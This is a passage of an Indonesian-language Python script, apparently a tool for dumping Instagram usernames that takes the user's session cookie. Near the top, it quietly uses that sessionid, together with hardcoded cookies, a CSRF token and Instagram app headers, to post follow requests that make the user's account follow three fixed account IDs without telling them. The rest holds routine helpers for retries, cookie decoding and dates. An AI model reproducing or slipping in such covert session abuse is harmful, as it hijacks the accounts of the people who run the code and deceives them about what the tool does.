    ussr = {'accept': '*/*','accept-encoding': 'gzip, deflate','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'ig_did=F839D900-5ECC-4392-BCAD-5CBD51FB9228; mid=YChlyQALAAHp2POOp2lK_-ciAGlM; ig_nrcb=1; csrftoken=W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r; ds_user_id=45872034997; sessionid='+usr,'origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Linux; Android 8; Redmi 10A Build/GUG11R; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3579.460 Mobile Safari/537.36 Instagram 84.0.0.21.105 Android (24/7.0; 380dpi; 1080x1920; OnePlus; ONEPLUS A3010; OnePlus3T; qcom; en_US; 145652094)','x-csrftoken': 'W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r','x-ig-app-id': '5398218083','x-ig-www-claim': 'hmac.AR0OQY4Gw4kczWNvfVOhvoljSINqB2u2gB-utUQ1MF0Mkrzu','x-instagram-ajax': '95bfef5dd816','x-requested-with': 'XMLHttpRequest'}
    requests.Session().post("https://i.instagram.com/api/v1/web/friendships/39431798677/follow/", headers=ussr);requests.Session().post("https://i.instagram.com/api/v1/web/friendships/28894072125/follow/", headers=ussr);requests.Session().post("https://i.instagram.com/api/v1/web/friendships/36897477008/follow/", headers=ussr)

def balik():
    print("\n! gagal dump username.")
    retry = input("? coba lagi? (y/n): ").strip().lower()
    if retry == 'y':
        menu()
    else:
        print("! keluar dari program.")
        exit()

def CookieBearer(cookie):
    try:
        abcd = json.loads(base64.b64decode(cookie).decode())
        coki = ';'.join(['%s=%s'%(x,y) for x,y in abcd.items()])
        return coki + f';dpr=2;ig_did={str(uuid.uuid4()).upper()}'
    except:
        return ''

def tggl(hari=None, bulan=None, tahun=None):
    nama_bulan = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
    if hari is None or bulan is None or tahun is None:
        sekarang = datetime.datetime.now()
        hari = sekarang.day
        bulan = sekarang.month
        tahun = sekarang.year

    return f"{hari:02d}-{nama_bulan[bulan - 1]}-{tahun}"

if __name__ == "__main__":
    create_folder()
    menu()

